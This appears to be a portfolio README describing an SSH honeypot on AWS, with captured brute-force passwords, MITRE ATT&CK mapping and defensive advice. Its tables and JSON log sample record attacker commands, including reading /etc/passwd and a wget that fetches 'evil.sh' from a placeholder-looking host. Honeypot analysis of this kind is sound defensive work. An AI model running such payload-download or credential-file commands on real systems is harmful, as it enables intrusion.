# 🍯 SSH Honeypot & Attack Analysis

![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Platform](https://img.shields.io/badge/Platform-AWS%20EC2-orange)
![Tool](https://img.shields.io/badge/Tool-Cowrie-blue)
![Category](https://img.shields.io/badge/Category-Threat%20Detection-red)

## 📌 Project Overview

Deployed a Cowrie SSH honeypot on AWS EC2 (EU-North-1) exposed on port 2222 to capture real-world attack behavior. Logged attacker credentials, commands, and session data for threat analysis and MITRE ATT&CK mapping.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| Cowrie 2.9.14 | SSH honeypot framework |
| AWS EC2 (t3.micro) | Cloud deployment — EU North 1 |
| Ubuntu 24.04 | Host OS |
| Python 3.12 | Cowrie runtime |
| JSON Logs | Structured attack data capture |

---

## 🏗️ Lab Setup

- **Cloud Provider:** AWS EC2 — EU North 1 (Stockholm)
- **Instance Type:** t3.micro (Ubuntu 24.04)
- **Honeypot Port:** 2222 (exposed to 0.0.0.0/0)
- **Real SSH Port:** 22 (admin access only)
- **Cowrie Version:** 2.9.14

```
Internet
    │
    ▼
AWS EC2 (13.60.247.212)
├── Port 22  → Real SSH (admin only)
└── Port 2222 → Cowrie Honeypot (public)
        │
        ▼
   Fake Debian Shell (svr04)
        │
        ▼
   JSON Logs → Analysis
```

---

## 📊 Attack Data Captured

### Session Summary

| Metric | Value |
|--------|-------|
| Total Sessions | 16 |
| Observation Period | ~35 minutes |
| Unique Passwords Captured | 16 |
| Commands Executed | 4 |
| Malware Download Attempts | 1 |

---

### 🔑 Credentials Captured

| # | Username | Password | Pattern |
|---|----------|----------|---------|
| 1 | root | admin123 | Common default |
| 2 | root | hello123 | Dictionary + numbers |
| 3 | root | admin 123 | Space variant |
| 4 | root | password123455 | Common base + numbers |
| 5 | root | pswwrd | Typo variant |
| 6 | root | 1234556789 | Numeric sequence |
| 7 | root | hellopass | Dictionary combo |
| 8 | root | pasas | Short weak password |
| 9 | root | root123 | Username + numbers |
| 10 | root | fastcrack3455 | Custom wordlist |
| 11 | root | required | Single dictionary word |
| 12 | root | debian123 | OS name + numbers |
| 13 | root | user123 | Generic + numbers |
| 14 | root | User123 | Case variant |
| 15 | root | Rootuser | Username reverse combo |
| 16 | root | rootuser | Lowercase variant |

---

### 💻 Commands Executed by Attacker

| Command | Purpose | MITRE Technique |
|---------|---------|-----------------|
| `whoami` | Privilege check | T1033 |
| `cat /etc/passwd` | User enumeration | T1087.001 |
| `uname -a` | System fingerprinting | T1082 |
| `wget http://malware.com/evil.sh` | Malware download attempt | T1105 |

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID | Observed Behavior |
|--------|-----------|-----|-------------------|
| Initial Access | Brute Force: Password Spraying | T1110.003 | 16 password attempts against root |
| Discovery | System Information Discovery | T1082 | `uname -a` executed |
| Discovery | Account Discovery: Local Account | T1087.001 | `cat /etc/passwd` executed |
| Privilege Escalation | Valid Accounts: Local Accounts | T1078.003 | Logged in as root directly |
| Command & Control | Ingress Tool Transfer | T1105 | `wget` malware download attempted |

---

## 🔍 Key Findings

1. **Root account exclusively targeted** — 100% of attempts used `root`, consistent with automated SSH scanners
2. **Automated brute force pattern** — Sessions 2–16 show 2–4 second intervals, indicating scripted tooling
3. **Weak password wordlists** — Passwords match common lists like RockYou and SecLists
4. **Immediate post-exploitation** — Attacker ran 4 commands within 90 seconds of gaining access
5. **Malware delivery attempted** — `wget` used to pull external payload; blocked by sandbox DNS isolation
6. **Cowrie deception successful** — Attacker interacted with fake shell for 295 seconds undetected

---

## 📁 Log Sample

```json
{"eventid":"cowrie.login.success","username":"root","password":"admin123","src_ip":"223.237.190.129","timestamp":"2026-03-15T15:01:42Z"}
{"eventid":"cowrie.command.input","input":"whoami","src_ip":"223.237.190.129","timestamp":"2026-03-15T15:02:36Z"}
{"eventid":"cowrie.command.input","input":"cat /etc/passwd","src_ip":"223.237.190.129","timestamp":"2026-03-15T15:02:42Z"}
{"eventid":"cowrie.command.input","input":"wget http://malware.com/evil.sh","src_ip":"223.237.190.129","timestamp":"2026-03-15T15:03:01Z"}
{"eventid":"cowrie.session.closed","duration":"295.2","src_ip":"223.237.190.129","timestamp":"2026-03-15T15:06:19Z"}
```

---

## 🛡️ Defensive Recommendations

| Finding | Recommendation |
|---------|---------------|
| Root brute force | Disable root SSH login (`PermitRootLogin no`) |
| Weak passwords | Enforce strong passwords / use SSH keys only |
| Automated scanning | Implement fail2ban or rate limiting |
| Malware download | Block outbound wget/curl to unknown domains |
| Post-login recon | Alert on rapid sequential commands after login |

---

## 📂 Repository Structure

```
SSH-Honeypot-Attack-Analysis/
├── README.md
├── logs/
│   └── cowrie.json          # Raw honeypot log data
├── analysis/
│   └── attack_summary.md    # Detailed attack analysis
└── screenshots/
    └── (terminal screenshots)
```

---

## ✅ Skills Demonstrated

- Honeypot deployment and configuration on cloud infrastructure
- SSH brute force attack detection and analysis
- Credential harvesting pattern recognition
- MITRE ATT&CK threat mapping
- Structured JSON log analysis
- AWS EC2 security group configuration
- Threat intelligence reporting

---

## 📌 References

- [Cowrie GitHub](https://github.com/cowrie/cowrie)
- [MITRE ATT&CK T1110.003](https://attack.mitre.org/techniques/T1110/003/)
- [MITRE ATT&CK T1082](https://attack.mitre.org/techniques/T1082/)
- [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/)
